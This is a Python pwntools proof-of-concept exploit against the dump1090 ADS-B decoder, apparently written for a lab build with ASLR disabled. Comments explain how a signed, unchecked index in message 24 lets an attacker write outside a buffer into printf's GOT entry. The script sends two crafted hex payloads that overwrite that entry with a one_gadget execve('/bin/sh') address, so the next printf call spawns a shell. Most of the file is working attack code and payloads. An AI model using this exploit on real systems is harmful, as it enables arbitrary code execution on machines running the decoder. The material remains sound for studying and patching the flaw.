#!/usr/bin/env python3

#1. build the binary $make dump1090_pwn
#2. disable ASLR #sysctl kernel.randomize_va_space=0
#3. run poc.py $./poc.py

from pwn import *

'''
kali@ubuntu:~$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''

conn = process(["/home/spots/SPOTS_dump1090/dump1090","--ifile", "-", "--hex", "--no-crc-check", "--no-fix"])

#gdb.attach(conn, "b* decodeHexMessage+585")
#gdb.attach(conn, "b* displayModesMessage+1970")
#gdb.attach(conn, "b* decodeModesMessage+0x8bd")
gdb.attach(conn)


'''
malicious payload

To calculate address of onegadget, you need to add the offset of the 1gadget to the base address of the libc. You can see the memory map to find the base address using the vmmap command in gdbpeda.

the index of message 24 is multiplied by 4 and uses a signed uint_16t meaning that the index can be negative. We abuse that to reach the printf.got and overwrite it with the 1gadget. This is a common flaw where the clien trust that the index is valid.

gdb-peda$ distance [elm] [printf.got]
gdb-peda$ p/x -1296/4
$1 = 0xfffffebc


Just make sure that the requirement for your 1gadget are met. in our case r15 was already NULL. We only had to make sure that the rdx was either null or a pointer to null. Our stage 1 does 2 things: 
Stage1A. initialize the printf.got with a libc address (we only overwrite the last 4 bytes). 
Stage1B. initialise our elm buffer with null bytes as this is what rdx will point to when calling our 1 gadget.
'''

#         [msg 24   ]   [index]  [NULL]       [00]   [checksum]
payload = "*c38d5d91" + "0000" + "00000000" + "00" + "b31cb8;"
conn.sendline(payload)

'''
Stage2. Overwrites the last 4 bytes of printf.got with the last 4 bytes of the 1 gadget.
'''
#         [msg 24   ]   [index]  [1gadget]    [00]   [checksum]
payload = "*c38d5d91" + "b0fe" + "815cd2f7" + "00" + "b31cb8;"
conn.sendline(payload)

#when printf is called to print this payload, it spawns a shell ;)

conn.interactive()

